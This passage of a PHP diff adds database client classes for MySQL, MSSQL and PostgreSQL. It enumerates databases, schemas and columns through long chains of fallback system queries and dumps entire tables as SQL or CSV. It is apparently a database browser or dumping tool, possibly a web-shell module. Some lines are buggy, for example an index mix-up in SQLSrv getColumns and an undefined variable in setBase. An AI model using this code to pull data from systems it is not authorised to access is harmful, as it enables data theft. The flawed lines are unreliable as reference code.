+                        } while (is_string($v = mysql_field_name($q, ++$i)));
+                        return $a;
+                    }
+                }
+                if (($v = mysql_query('SELECT * FROM ' . $e . ' LIMIT 1', $this->_cnct)) && ($v = mysql_fetch_assoc($v))) {
+                    foreach ($v as $k => $s)
+                        $a[$k] = '';
+                    return $a;
+                }
+                return FALSE;
+            }
+            function fetchAssoc() {
+                return mysql_fetch_assoc($this->_res);
+            }
+            function fetchRow() {
+                return mysql_fetch_row($this->_res);
+            }
+            function query($v) {
+                return ($this->_res = mysql_query($v, $this->_cnct));
+            }
+            function dump($b, $t, $c, $f) {
+                if ($f)
+                    $i = $this->outCreateTable($b, $t);
+                $c = sqlJoinColumns($c, 'mysqlEscName');
+                if (($q = mysql_unbuffered_query('SELECT ' . $c . ' FROM ' . mysqlEscName($b, $t), $this->_cnct)) && ($v = mysql_fetch_assoc($q))) {
+                    if ($f)
+                        sqlOutInsert(mysqlEscName($t), $c);
+                    else
+                        echo implode(';', array_keys($v)), "\n";
+                    $d = FALSE;
+                    do {
+                        if ($d)
+                            echo $d;
+                        else
+                            $d = $f ? ',' : "\n";
+                        if ($f)
+                            sqlOutValues($v, 'mysqlEscData');
+                        else
+                            csvOutValues($v);
+                    } while ($v = mysql_fetch_row($q));
+                    if ($f)
+                        echo ";\n";
+                    mysql_free_result($q);
+                } else
+                    $i .= sprintf(E_SLCTDT, $b . '.' . $t);
+                return $i;
+            }
+            function close() {
+                mysql_close($this->_cnct);
+            }
+        }
+        class MySQLiClient extends MySQLBase {
+            function connect($h, $u, $p, $b, $c) {
+                if ($h !== NULL && ($v = strrpos($h, ':'))) {
+                    $t = (int) substr($h, $v + 1);
+                    $h = substr($h, 0, $v);
+                } else
+                    $t = NULL;
+                if (!($this->_cnct = mysqli_connect($h, $u, $p, $b, $t)))
+                    return FALSE;
+                mysqli_query($this->_cnct, 'SET NAMES ' . $this->charset($c));
+                return TRUE;
+            }
+            function getError() {
+                if ($this->_cnct) {
+                    $v = mysqli_error($this->_cnct);
+                    mysqli_close($this->_cnct);
+                    return $v;
+                }
+                return mysqli_connect_error();
+            }
+            function tryQueries($a) {
+                foreach ($a as $v)
+                    if ($this->_res = mysqli_query($this->_cnct, $v))
+                        return TRUE;
+                return FALSE;
+            }
+            function fetchBase() {
+                return ($v = mysqli_fetch_row($this->_res)) ? $v[0] : FALSE;
+            }
+            function fetchTable() {
+                return ($v = mysqli_fetch_row($this->_res)) ? $v[0] : FALSE;
+            }
+            function getTableSize($b, $t) {
+                if ($v = mysqli_query($this->_cnct, 'SELECT COUNT(*) FROM ' . mysqlEscName($b, $t))) {
+                    $v = mysqli_fetch_row($v);
+                    return $v[0];
+                }
+                return '"?"';
+            }
+            function getColumns($b, $t) {
+                if ($a = parent::getColumns($b, $t))
+                    return $a;
+                $e = mysqlEscName($b, $t);
+                $q = FALSE;
+                if ($q = mysqli_query($this->_cnct, 'SELECT * FROM ' . $e . ' LIMIT 1')) {
+                    $y = array(
+                        'DECIMAL',
+                        'TINYINT',
+                        'SMALLINT',
+                        'INT',
+                        'FLOAT',
+                        'DOUBLE',
+                        'NULL',
+                        'TIMESTAMP',
+                        'BIGINT',
+                        'MEDIUMINT',
+                        'DATE',
+                        'TIME',
+                        'DATETIME',
+                        'YEAR',
+                        'NEWDATE',
+                        16 => 'BIT',
+                        246 => 'DECIMAL',
+                        247 => 'ENUM',
+                        248 => 'SET',
+                        249 => 'TINY',
+                        250 => 'MEDIUM',
+                        251 => 'LONG',
+                        252 => '',
+                        253 => 'VARCHAR',
+                        254 => 'CHAR',
+                        255 => 'GEOMETRY'
+                    );
+                    if (!($v = mysqli_fetch_fields($q)) && ($i = mysqli_fetch_field($q))) {
+                        $v = array();
+                        do {
+                            $v[] = $i;
+                        } while ($i = mysqli_fetch_field($q));
+                    }
+                    if ($v) {
+                        foreach ($v as $i) {
+                            if ($i->type > 248 && $i->type < 253)
+                                $s = $y[$i->type] . (($i->flags & 16) ? 'BLOB' : 'TEXT');
+                            else
+                                $s = isset($y[$i->type]) ? $y[$i->type] : 'BLOB';
+                            if ($i->flags & 32768) {
+                                $s .= '(' . $i->length;
+                                if ($i->decimals)
+                                    $s .= ',' . $i->decimals;
+                                $s .= ')';
+                            }
+                            if ($i->flags & 32)
+                                $s .= ' UNSIGNED';
+                            if ($i->flags & 64)
+                                $s .= ' ZEROFILL';
+                            if ($i->flags & 1)
+                                $s .= ' NOT NULL';
+                            if (isset($i->def) && $i->def !== '' && $i->def !== NULL)
+                                $s .= ' DEFAULT ' . mysqlEscData($i->def);
+                            if ($i->flags & 512)
+                                $s .= ' AUTO_INCREMENT';
+                            if ($i->flags & 2)
+                                $s .= ' PRIMARY KEY';
+                            elseif (($i->flags & 4) || ($i->flags & 65536))
+                                $s .= ' UNIQUE KEY';
+                            elseif (($i->flags & 8) || ($i->flags & 16384))
+                                $s .= ', KEY(' . mysqlEscName($i->name) . ')';
+                            $a[$i->name] = $s;
+                        }
+                        return $a;
+                    }
+                    if ($v = mysqli_fetch_assoc($q)) {
+                        foreach ($v as $k => $i)
+                            $a[$k] = '';
+                        return $a;
+                    }
+                }
+                return FALSE;
+            }
+            function fetchAssoc() {
+                return mysqli_fetch_assoc($this->_res);
+            }
+            function fetchRow() {
+                return mysqli_fetch_row($this->_res);
+            }
+            function query($v) {
+                return ($this->_res = mysqli_query($this->_cnct, $v));
+            }
+            function dump($b, $t, $c, $f) {
+                if ($f)
+                    $i = $this->outCreateTable($b, $t);
+                $c = sqlJoinColumns($c, 'mysqlEscName');
+                if (($q = mysqli_query($this->_cnct, 'SELECT ' . $c . ' FROM ' . mysqlEscName($b, $t), MYSQLI_USE_RESULT)) && ($v = mysqli_fetch_assoc($q))) {
+                    if ($f)
+                        sqlOutInsert(mysqlEscName($t), $c);
+                    else
+                        echo implode(';', array_keys($v)), "\n";
+                    $d = FALSE;
+                    do {
+                        if ($d)
+                            echo $d;
+                        else
+                            $d = $f ? ',' : "\n";
+                        if ($f)
+                            sqlOutValues($v, 'mysqlEscData');
+                        else
+                            csvOutValues($v);
+                    } while ($v = mysqli_fetch_row($q));
+                    if ($f)
+                        echo ";\n";
+                    mysqli_free_result($q);
+                } else
+                    $i .= sprintf(E_SLCTDT, $b . '.' . $t);
+                return $i;
+            }
+            function close() {
+                mysqli_close($this->_cnct);
+            }
+        }
+        function mssqlEscData($v) {
+            return "'" . str_replace("'", "''", $v) . "'";
+        }
+        function mssqlEscName() {
+            $a = func_get_args();
+            foreach ($a as $k => $v)
+                $a[$k] = '[' . str_replace(']', ']]', $v) . ']';
+            return implode('.', $a);
+        }
+        class MSSQLBase extends SQLBase {
+            var $haveSchemas = TRUE, $canPaginate = TRUE, $_base = NULL;
+            function getBases() {
+                return $this->tryQueries(array(
+                    'SELECT name FROM sys.databases',
+                    'SELECT name FROM sys.sysdatabases',
+                    'SELECT name FROM master.dbo.sysdatabases',
+                    'EXEC sp_oledb_database',
+                    'EXEC master.dbo.sp_msdbuseraccess "db"',
+                    'EXEC master.sys.sp_msdbuseraccess "db"',
+                    "EXEC sp_msforeachdb 'SELECT ''?'''",
+                    'EXEC sp_helpdb',
+                    'EXEC sp_databases',
+                    'EXEC sp_oledb_defdb',
+                    'SELECT DISTINCT catalog_name FROM information_schema.schemata',
+                    'SELECT DB_NAME()'
+                ));
+            }
+            function getSchemas($b) {
+                return $this->tryQueries(array(
+                    'SELECT NULL,schema_name FROM information_schema.schemata',
+                    'SELECT NULL,name FROM sys.schemas',
+                    'SELECT DISTINCT schema_id,SCHEMA_NAME(schema_id) FROM sys.all_objects',
+                    'EXEC sp_schemata_rowset',
+                    'SELECT DISTINCT schema_id,SCHEMA_NAME(schema_id) FROM sys.objects',
+                    'SELECT DISTINCT schema_id,SCHEMA_NAME(schema_id) FROM sys.tables',
+                    "SELECT NULL,name FROM sys.database_principals WHERE type='S'"
+                ));
+            }
+            function getTables($b, $s) {
+                $s = mssqlEscData($s);
+                if ($this->query('SELECT SCHEMA_ID(' . $s . ')') && ($v = $this->fetchRow()) && $v[0]) {
+                    $sr = 'schema_id=' . $v[0];
+                    $ur = 'uid=' . $v[0];
+                } else {
+                    $sr = 'SCHEMA_NAME(schema_id)=' . $s;
+                    $ur = 'SCHEMA_NAME(uid)=' . $s;
+                }
+                return $this->tryQueries(array(
+                    "SELECT name FROM sys.all_objects WHERE type IN('U','S','V') AND " . $sr,
+                    'EXEC sp_tables @table_owner=' . $s,
+                    "SELECT name FROM sys.objects WHERE type IN('U','S','V') AND " . $sr,
+                    "SELECT name FROM sysobjects WHERE xtype IN('U','S','V') AND " . $ur,
+                    'SELECT table_name FROM information_schema.tables WHERE table_schema=' . $s,
+                    'SELECT name FROM sys.tables WHERE ' . $sr,
+                    "EXEC sp_msforeachtable 'SELECT PARSENAME(''?'',1)', @whereand='AND " . str_replace("'", "''", $sr) . "'"
+                ));
+            }
+            function getColumns($b, $s, $t) {
+                $a    = array();
+                $sd   = mssqlEscData($s);
+                $sn   = mssqlEscName($s);
+                $td   = mssqlEscData($t);
+                $tn   = mssqlEscName($t);
+                $stdn = mssqlEscData($sn . '.' . $tn);
+                if ($this->query('EXEC sp_columns ' . $td . ',' . $sd) && $v = $this->fetchRow()) {
+                    do {
+                        $v[5] = strtoupper($v[5]);
+                        if ($v[10] === 0)
+                            $v[5] .= ' NOT NULL';
+                        if ($v[12] !== NULL)
+                            $v[5] .= ' DEFAULT' . $v[12];
+                        $a[$v[3]] = $v[5];
+                    } while ($v = $this->fetchRow());
+                    return $a;
+                }
+                if ($this->query('EXEC sp_help ' . $stdn) && $this->nextResult() && ($v = $this->fetchRow())) {
+                    do {
+                        $v[1] = strtoupper($v[1]);
+                        if ($v[6] === 'no')
+                            $v[1] .= ' NOT NULL';
+                        $a[$v[0]] = $v[1];
+                    } while ($v = $this->fetchRow());
+                    return $a;
+                }
+                if ($this->query('EXEC sp_mshelpcolumns ' . $stdn) && $v = $this->fetchRow()) {
+                    do {
+                        $v[6] = strtoupper($v[6]);
+                        if ($v[9] === 0)
+                            $v[6] .= ' NOT NULL';
+                        if ($v[17] !== NULL)
+                            $v[6] .= ' DEFAULT' . $v[17];
+                        $a[$v[0]] = $v[6];
+                    } while ($v = $this->fetchRow());
+                    return $a;
+                }
+                if ($this->query('SELECT column_name,data_type,is_nullable,column_default FROM information_schema.columns WHERE table_name=' . $td . ' AND table_schema=' . $sd) && $v = $this->fetchRow()) {
+                    do {
+                        $v[1] = strtoupper($v[1]);
+                        if ($v[2] === 'NO')
+                            $v[1] .= ' NOT NULL';
+                        if ($v[3] !== NULL)
+                            $v[1] .= ' DEFAULT' . $v[3];
+                        $a[$v[0]] = $v[1];
+                    } while ($v = $this->fetchRow());
+                    return $a;
+                }
+                if ($this->query('EXEC sp_columns_managed @owner=' . $sd . ', @table=' . $td) && $v = $this->fetchRow()) {
+                    do {
+                        $v[7] = strtoupper($v[7]);
+                        if ($v[6] === 'NO')
+                            $v[7] .= ' NOT NULL';
+                        if ($v[5] !== NULL)
+                            $v[7] .= ' DEFAULT' . $v[5];
+                        $a[$v[3]] = $v[7];
+                    } while ($v = $this->fetchRow());
+                    return $a;
+                }
+                if ($this->query('SELECT OBJECT_ID(' . $stdn . ')') && $v = $this->fetchRow()) {
+                    $r = 'object_id=' . $v[0];
+                    $i = 'id=' . $v[0];
+                } else {
+                    $r = 'OBJECT_SCHEMA_NAME(object_id)=' . $sd . ' AND OBJECT_NAME(object_id)=' . $td;
+                    $i = 'OBJECT_SCHEMA_NAME(id)=' . $sd . ' AND OBJECT_NAME(id)=' . $td;
+                }
+                if ($this->tryQueries(array(
+                    'SELECT name,TYPE_NAME(system_type_id),is_nullable FROM sys.all_columns WHERE ' . $r,
+                    'SELECT name,TYPE_NAME(xtype),isnullable FROM syscolumns WHERE ' . $i,
+                    'SELECT name,TYPE_NAME(system_type_id),is_nullable FROM sys.columns WHERE ' . $r
+                ))) {
+                    while ($v = $this->fetchRow()) {
+                        $v[1] = strtoupper($v[1]);
+                        if ($v[2] === 0)
+                            $v[1] .= ' NOT NULL';
+                        $a[$v[0]] = $v[1];
+                    }
+                    return $a;
+                }
+                if ($this->query('EXEC sp_columns_rowset ' . $td . ',' . $sd) && $v = $this->fetchRow()) {
+                    do {
+                        $v[11] = 'BINARY';
+                        if ($v[10] === 0)
+                            $v[11] .= ' NOT NULL';
+                        if ($v[8] !== NULL)
+                            $v[11] .= ' DEFAULT' . $v[8];
+                        $a[$v[3]] = $v[11];
+                    } while ($v = $this->fetchRow());
+                    return $a;
+                }
+                return FALSE;
+            }
+        }
+        class MSSQLClient extends MSSQLBase {
+            function connect($h, $u, $p, $b, $c) {
+                if (!($this->_cnct = mssql_connect($h, $u, $p)))
+                    return FALSE;
+                return $this->setBase($b);
+            }
+            function getError() {
+                $v = mssql_get_last_message();
+                if ($this->_cnct)
+                    mssql_close($this->_cnct);
+                return $v;
+            }
+            function tryQueries($a) {
+                foreach ($a as $v)
+                    if ($this->_res = mssql_query($v, $this->_cnct))
+                        return TRUE;
+                return FALSE;
+            }
+            function fetchBase() {
+                if (($v = mssql_fetch_row($this->_res)) || (mssql_next_result($this->_res) && ($v = mssql_fetch_row($this->_res))))
+                    return $v[0];
+                return FALSE;
+            }
+            function fetchSchema() {
+                return ($v = mssql_fetch_row($this->_res)) ? $v[1] : FALSE;
+            }
+            function fetchTable() {
+                if (($v = mssql_fetch_row($this->_res)) || (mssql_next_result($this->_res) && ($v = mssql_fetch_row($this->_res))))
+                    return count($v) === 1 ? $v[0] : $v[2];
+                return FALSE;
+            }
+            function getTableSize($b, $s, $t) {
+                return ($v = mssql_query('SELECT COUNT(*) FROM ' . mssqlEscName($b, $s, $t), $this->_cnct)) ? mssql_result($v, 0, 0) : '"?"';
+            }
+            function setBase($v) {
+                if ($v !== $this->_base) {
+                    $this->_base = NULL;
+                    if (!mssql_select_db(mssqlEscName($v), $this->_cnct) && !mssql_query('USE ' . mssqlEscName($v), $this->_cnct))
+                        return FALSE;
+                    $this->_base = $v;
+                }
+                return TRUE;
+            }
+            function getColumns($b, $s, $t) {
+                if ($a = parent::getColumns($b, $s, $t))
+                    return $a;
+                $a = array();
+                if ($q = mssql_query('SELECT TOP 1 * FROM ' . mssqlEscName($b, $s, $t), $this->_cnct)) {
+                    if ($v = mssql_fetch_field($q)) {
+                        do {
+                            $a[$v->name] = strtoupper($v->type);
+                        } while ($v = mssql_fetch_field($q));
+                        return $a;
+                    }
+                    if (is_string($v = mssql_field_name($q, 0))) {
+                        $i = 0;
+                        do {
+                            $a[$v] = is_string($s = mssql_field_type($q, $i)) ? strtoupper($s) : '';
+                        } while (is_string($v = mssql_field_name($q, ++$i)));
+                        return $a;
+                    }
+                    if ($v = mssql_fetch_array($q, MSSQL_ASSOC)) {
+                        foreach ($v as $k => $i)
+                            $a[$k] = '';
+                        return $a;
+                    }
+                }
+                return FALSE;
+            }
+            function select($b, $s, $t, $c, $o, $l) {
+                $v = $l < 1000 ? 1000 : $l;
+                if (!($this->_res = mssql_query('SELECT TOP ' . ($o + $l) . ' ' . sqlJoinColumns($c, 'mssqlEscName') . ' FROM ' . mssqlEscName($b, $s, $t), $this->_cnct, $v)))
+                    return FALSE;
+                $k = floor($o / $v);
+                for ($i = 0; $i < $k; ++$i)
+                    if (!mssql_fetch_batch($this->_res))
+                        return FALSE;
+                $k = $o - ($k * $v);
+                if ($k > 0 && !mssql_data_seek($this->_res, $k))
+                    return FALSE;
+                return TRUE;
+            }
+            function fetchAssoc() {
+                return mssql_fetch_array($this->_res, MSSQL_ASSOC);
+            }
+            function fetchRow() {
+                if (($v = mssql_fetch_row($this->_res)) || (mssql_fetch_batch($this->_res) && ($v = mssql_fetch_row($this->_res))))
+                    return $v;
+                return FALSE;
+            }
+            function nextResult() {
+                return mssql_next_result($this->_res);
+            }
+            function query($v) {
+                return ($this->_res = mssql_query($v, $this->_cnct));
+            }
+            function dump($b, $s, $t, $c, $f) {
+                if (!$this->setBase($b))
+                    return sprintf(E_CHNGDB, $b, $s, $t);
+                $i = '';
+                if ($f) {
+                    if ($v = $this->getColumns($b, $s, $t))
+                        sqlOutCreate($t, $v, 'BINARY', 'mssqlEscName');
+                    else
+                        $i = sprintf(E_CNSTCS, $b . '.' . $s . '.' . $t);
+                }
+                $c = sqlJoinColumns($c, 'mssqlEscName');
+                if (($q = mssql_query('SELECT ' . $c . ' FROM ' . mssqlEscName($b, $s, $t), $this->_cnct, 1000)) && ($v = mssql_fetch_array($q, MSSQL_ASSOC))) {
+                    if ($f)
+                        sqlOutInsert(mssqlEscName($t), $c);
+                    else
+                        echo implode(';', array_keys($v)), "\n";
+                    $d = FALSE;
+                    do {
+                        do {
+                            if ($d)
+                                echo $d;
+                            else
+                                $d = $f ? ',' : "\n";
+                            if ($f)
+                                sqlOutValues($v, 'mssqlEscData');
+                            else
+                                csvOutValues($v);
+                        } while ($v = mssql_fetch_row($q));
+                    } while (mssql_fetch_batch($q));
+                    if ($f)
+                        echo ";\n";
+                    mssql_free_result($q);
+                } else
+                    $i .= sprintf(E_SLCTDT, $b . '.' . $s . '.' . $t);
+                return $i;
+            }
+            function close() {
+                mssql_close($this->_cnct);
+            }
+        }
+        class SQLSrvClient extends MSSQLBase {
+            function connect($h, $u, $p, $b, $c) {
+                $this->_base = $b;
+                $a           = array();
+                if ($u !== NULL)
+                    $a['UID'] = $u;
+                if ($p !== NULL)
+                    $a['PWD'] = $p;
+                if ($b !== NULL)
+                    $a['Database'] = $b;
+                return ($this->_cnct = sqlsrv_connect($h, $a));
+            }
+            function getError() {
+                $v = sqlsrv_errors();
+                if ($this->_cnct)
+                    sqlsrv_close($this->_cnct);
+                return $v ? $v[0]['message'] : '';
+            }
+            function tryQueries($a) {
+                foreach ($a as $v)
+                    if ($this->_res = sqlsrv_query($this->_cnct, $v))
+                        return TRUE;
+                return FALSE;
+            }
+            function fetchBase() {
+                return (($v = sqlsrv_fetch_array($this->_res, SQLSRV_FETCH_NUMERIC)) || (sqlsrv_next_result($this->_res) && ($v = sqlsrv_fetch_array($this->_res, SQLSRV_FETCH_NUMERIC)))) ? $v[0] : FALSE;
+            }
+            function fetchSchema() {
+                return ($v = sqlsrv_fetch_array($this->_res, SQLSRV_FETCH_NUMERIC)) ? $v[1] : FALSE;
+            }
+            function fetchTable() {
+                if (($v = sqlsrv_fetch_array($this->_res, SQLSRV_FETCH_NUMERIC)) || (sqlsrv_next_result($this->_res) && ($v = sqlsrv_fetch_array($this->_res, SQLSRV_FETCH_NUMERIC))))
+                    return count($v) === 1 ? $v[0] : $v[2];
+                return FALSE;
+            }
+            function getTableSize($b, $s, $t) {
+                return (($v = sqlsrv_query($this->_cnct, 'SELECT COUNT(*) FROM ' . mssqlEscName($b, $s, $t))) && ($v = sqlsrv_fetch_array($v, SQLSRV_FETCH_NUMERIC))) ? $v[0] : '"?"';
+            }
+            function getColumns($b, $s, $t) {
+                if ($a = parent::getColumns($b, $s, $t))
+                    return $a;
+                $a = array();
+                if ($q = sqlsrv_query($this->_cnct, 'SELECT TOP 1 * FROM ' . mssqlEscName($b, $s, $t))) {
+                    if ($v = sqlsrv_field_metadata($q)) {
+                        $y = array(
+                            1 => 'CHAR',
+                            2 => 'NUMERIC',
+                            3 => 'DECIMAL',
+                            4 => 'INT',
+                            5 => 'SMALLINT',
+                            6 => 'FLOAT',
+                            7 => 'REAL',
+                            12 => 'VARCHAR',
+                            91 => 'DATE',
+                            93 => 'DATETIME',
+                            -1 => 'TEXT',
+                            -2 => 'BINARY',
+                            -3 => 'VARBINARY',
+                            -4 => 'IMAGE',
+                            -5 => 'BIGINT',
+                            -6 => 'TINYINT',
+                            -7 => 'BIT',
+                            -8 => 'NCHAR',
+                            -9 => 'NVARCHAR',
+                            -10 => 'NTEXT',
+                            -11 => 'UNIQUEIDENTIFIER',
+                            -151 => 'UDT',
+                            -152 => 'XML',
+                            -154 => 'TIME',
+                            -155 => 'DATETIMEOFFSET'
+                        );
+                        foreach ($v as $i) {
+                            $i['Type'] = isset($y['Type']) ? $y['Type'] : 'BINARY';
+                            if ($i['Nullable'] === SQLSRV_NULLABLE_NO)
+                                $i['Type'] .= ' NOT NULL';
+                            $a[$i['Name']] = $i['Type'];
+                        }
+                        return $a;
+                    }
+                    if ($v = sqlsrv_fetch_array($q, SQLSRV_FETCH_ASSOC)) {
+                        foreach ($v as $k => $i)
+                            $a[$k] = '';
+                        return $a;
+                    }
+                }
+                return FALSE;
+            }
+            function select($b, $s, $t, $c, $o, $l) {
+                return (($this->_res = sqlsrv_query($this->_cnct, 'SELECT TOP ' . ($o + $l) . ' ' . sqlJoinColumns($c, 'mssqlEscName') . ' FROM ' . mssqlEscName($b, $s, $t), array(), array(
+                    'Scrollable' => SQLSRV_CURSOR_DYNAMIC
+                ))) && sqlsrv_fetch($this->_res, SQLSRV_SCROLL_ABSOLUTE, $o));
+            }
+            function fetchAssoc() {
+                return sqlsrv_fetch_array($this->_res, SQLSRV_FETCH_ASSOC);
+            }
+            function fetchRow() {
+                return sqlsrv_fetch_array($this->_res, SQLSRV_FETCH_NUMERIC);
+            }
+            function nextResult() {
+                return sqlsrv_next_result($this->_res);
+            }
+            function query($v) {
+                return ($this->_res = sqlsrv_query($this->_cnct, $v));
+            }
+            function setBase($v) {
+                if ($v !== $this->_base) {
+                    $this->_base = NULL;
+                    if (!sqlsrv_query($this->_cnct, 'USE ' . mssqlEscName($b)))
+                        return FALSE;
+                    $this->_base = $v;
+                }
+                return TRUE;
+            }
+            function dump($b, $s, $t, $c, $f) {
+                if (!$this->setBase($b))
+                    return sprintf(E_CHNGDB, $b, $s, $t);
+                $i = '';
+                if ($f) {
+                    if ($v = $this->getColumns($b, $s, $t))
+                        sqlOutCreate($t, $v, 'BINARY', 'mssqlEscName');
+                    else
+                        $i = sprintf(E_CNSTCS, $b . '.' . $s . '.' . $t);
+                }
+                $c = sqlJoinColumns($c, 'mssqlEscName');
+                if (($q = sqlsrv_query($this->_cnct, 'SELECT ' . $c . ' FROM ' . mssqlEscName($b, $s, $t))) && ($v = sqlsrv_fetch_array($q, SQLSRV_FETCH_ASSOC))) {
+                    if ($f)
+                        sqlOutInsert(mssqlEscName($t), $c);
+                    else
+                        echo implode(';', array_keys($v)), "\n";
+                    $d = FALSE;
+                    do {
+                        if ($d)
+                            echo $d;
+                        else
+                            $d = $f ? ',' : "\n";
+                        if ($f)
+                            sqlOutValues($v, 'mssqlEscData');
+                        else
+                            csvOutValues($v);
+                    } while ($v = sqlsrv_fetch_array($q, SQLSRV_FETCH_NUMERIC));
+                    if ($f)
+                        echo ";\n";
+                    sqlsrv_free_stmt($q);
+                } else
+                    $i .= sprintf(E_SLCTDT, $b . '.' . $s . '.' . $t);
+                return $i;
+            }
+            function close() {
+                sqlsrv_close($this->_cnct);
+            }
+        }
+        function pgsqlEscData($v) {
+            return "'" . str_replace(array(
+                '\\',
+                "'"
+            ), array(
+                '\\\\',
+                "''"
+            ), $v) . "'";
+        }
+        function pgsqlEscName() {
+            $a = func_get_args();
+            foreach ($a as $k => $v)
+                $a[$k] = '"' . str_replace('"', '""', $v) . '"';
+            return implode('.', $a);
+        }
+        class PGSQLBase extends SQLBase {
+            var $haveSchemas = TRUE, $canPaginate = FALSE, $_params = '', $_base = NULL, $_clcs = NULL;
+            function fillParams($h, $u, $p) {
+                $v = array();
+                if ($h !== NULL) {
+                    if ($i = strrpos($h, ':')) {
+                        $v[] = 'host=' . $this->escParam(substr($h, 0, $i));
+                        $v[] = 'port=' . substr($h, $i + 1);
+                    } else
+                        $v[] = 'host=' . $this->escParam($h);
+                }
+                if ($u !== NULL)
+                    $v[] = 'user=' . $this->escParam($u);
+                if ($p !== NULL)
+                    $v[] = 'password=' . $this->escParam($p);
+                $this->_params = implode(' ', $v);
+            }
+            function charset($k) {
+                $v = array(
+                    'UTF8',
+                    'UTF8',
+                    'WIN1250',
+                    'WIN1251',
+                    'WIN1252',
+                    'WIN1254',
+                    'WIN1256',
+                    'WIN1257',
+                    'LATIN1',
+                    'LATIN2',
+                    'ISO_8859_7',
+                    'ISO_8859_8',
+                    'LATIN5',
+                    'LATIN7',
+                    'BIG5',
+                    'GBK',
+                    'SJIS',
+                    'EUC_KR',
+                    'EUC_JP',
+                    'WIN866',
+                    'KOI8R',
+                    'KOI8U'
+                );
+                return isset($v[$k]) ? $v[$k] : 'utf8';
+            }
+            function escParam($v) {
+                return "'" . addcslashes($v, "'\\") . "'";
+            }
+            function getBases() {
+                return $this->tryQueries(array(
+                    'SELECT datname FROM pg_catalog.pg_database WHERE NOT datistemplate',
+                    'SELECT datname FROM pg_catalog.pg_stat_database',
+                    'SELECT datname FROM pg_catalog.pg_stat_database_conflicts',
+                    'SELECT current_database()'
+                ));
+            }
+            function getSchemas($b) {
+                if (!$this->setBase($b))
+                    return FALSE;
+                return $this->tryQueries(array(
+                    'SELECT schema_name FROM information_schema.schemata',
+                    'SELECT nspname FROM pg_catalog.pg_namespace',
+                    'SELECT DISTINCT table_schema FROM information_schema.tables',
+                    'SELECT DISTINCT schemaname FROM pg_catalog.pg_tables',
+                    'SELECT DISTINCT schemaname FROM pg_catalog.pg_stat_xact_all_tables',
+                    'SELECT DISTINCT schemaname FROM pg_catalog.pg_statio_all_tables',
+                    'SELECT DISTINCT schemaname FROM pg_catalog.pg_stat_user_tables UNION SELECT DISTINCT schemaname FROM pg_catalog.pg_stat_sys_tables',
+                    'SELECT DISTINCT schemaname FROM pg_catalog.pg_stat_xact_user_tables UNION SELECT DISTINCT schemaname FROM pg_catalog.pg_stat_xact_sys_tables',
+                    'SELECT DISTINCT schemaname FROM pg_catalog.pg_statio_user_tables UNION SELECT DISTINCT schemaname FROM pg_catalog.pg_statio_sys_tables',
+                    'SELECT DISTINCT table_schema FROM information_schema.columns',
+                    'SELECT DISTINCT schemaname FROM pg_catalog.pg_stats'
+                ));
+            }
+            function getTables($b, $s) {
+                if (!$this->setBase($b))
+                    return FALSE;
+                $s = pgsqlEscData($s);
+                return $this->tryQueries(array(
+                    'SELECT table_name FROM information_schema.tables WHERE table_schema=' . $s,
+                    'SELECT relname FROM pg_catalog.pg_stat_all_tables WHERE schemaname=' . $s,
+                    'SELECT relname FROM pg_catalog.pg_statio_all_tables WHERE schemaname=' . $s,
+                    'SELECT relname FROM pg_catalog.pg_stat_xact_all_tables WHERE schemaname=' . $s,
+                    'SELECT tablename FROM pg_catalog.pg_tables WHERE schemaname=' . $s,
+                    'SELECT relname FROM pg_catalog.pg_stat_sys_tables WHERE schemaname=' . $s,
+                    'SELECT relname FROM pg_catalog.pg_stat_user_tables WHERE schemaname=' . $s,
+                    'SELECT relname FROM pg_catalog.pg_statio_sys_tables WHERE schemaname=' . $s,
+                    'SELECT relname FROM pg_catalog.pg_statio_user_tables WHERE schemaname=' . $s,
+                    'SELECT relname FROM pg_catalog.pg_stat_xact_sys_tables WHERE schemaname=' . $s,
+                    'SELECT relname FROM pg_catalog.pg_stat_xact_user_tables WHERE schemaname=' . $s
+                ));
+            }
+            function getColumns($b, $s, $t) {
+                $a = array();
+                if ($this->tryQueries(array(
+                    'SELECT column_name,udt_name,is_nullable,column_default FROM information_schema.columns WHERE table_name=' . pgsqlEscData($t) . ' AND table_schema=' . pgsqlEscData($s),
+                    'SELECT a.attname, FORMAT_TYPE(a.atttypid,a.atttypmod), a.attnotnull, d.adsrc FROM pg_attribute a LEFT JOIN pg_attrdef d ON d.adrelid=a.attrelid AND d.adnum=a.attnum WHERE attrelid = ' . pgsqlEscData(pgsqlEscName($s, $t)) . '::regclass AND attnum>0 AND NOT attisdropped'
+                ))) {
+                    while ($v = $this->fetchRow()) {
+                        $v[1] = strtoupper($v[1]);
+                        if ($v[2][0] === 'N' || $v[2][0] === 'f')
+                            $v[1] .= ' NOT NULL';
+                        if ($v[3] !== NULL)
+                            $v[1] .= ' DEFAULT ' . pgsqlEscData($v[3]);
+                        $a[$v[0]] = $v[1];
+                    }
+                    return $a;
+                }
+                return FALSE;
+            }
+            function select($b, $s, $t, $c, $o, $l) {
+                return $this->query('SELECT ' . sqlJoinColumns($c, 'pgsqlEscName') . ' FROM ' . pgsqlEscName($s, $t) . ' LIMIT ' . $l);
+            }
+        }
+        class PGSQLClient extends PGSQLBase {
+            function connect($h, $u, $p, $b, $c) {
+                $this->_base = $b;
+                $this->_clcs = $c;
+                $this->fillParams($h, $u, $p);
+                $v = $this->_params;
+                if ($b !== NULL)
+                    $v .= ' dbname=' . $this->escParam($b);
+                $this->_cnct = pg_connect($v);
+                if (!$this->_cnct && $b === NULL)
+                    $this->_cnct = pg_connect($this->_params . ' dbname=template1');
+                if (!$this->_cnct)
+                    return FALSE;
+                pg_exec($this->_cnct, "SET CLIENT_ENCODING TO '" . $this->charset($c) . "'");
+                return TRUE;
+            }
+            function getError() {
+                if ($this->_cnct) {
+                    $v = (PHP_VERSION >= '4.2') ? pg_last_error($this->_cnct) : pg_errormessage($this->_cnct);
+                    pg_close($this->_cnct);
+                    return $v;
+                }
+                return '';
+            }
+            function tryQueries($a) {
+                foreach ($a as $v)
+                    if ($this->_res = pg_exec($this->_cnct, $v))
+                        return TRUE;
+                return FALSE;
+            }
+            function fetchBase() {
+                return ($v = pg_fetch_row($this->_res)) ? $v[0] : FALSE;
+            }
+            function setBase($v) {
+                if ($v !== $this->_base) {
+                    $this->_base = NULL;
+                    pg_close($this->_cnct);
+                    if (!($this->_cnct = pg_connect($this->_params . ' dbname=' . $this->escParam($v))))
+                        return FALSE;
+                    $this->_base = $v;
+                    pg_exec($this->_cnct, "SET CLIENT_ENCODING TO '" . $this->charset($this->_clcs) . "'");
+                }
+                return TRUE;
+            }
+            function fetchSchema() {
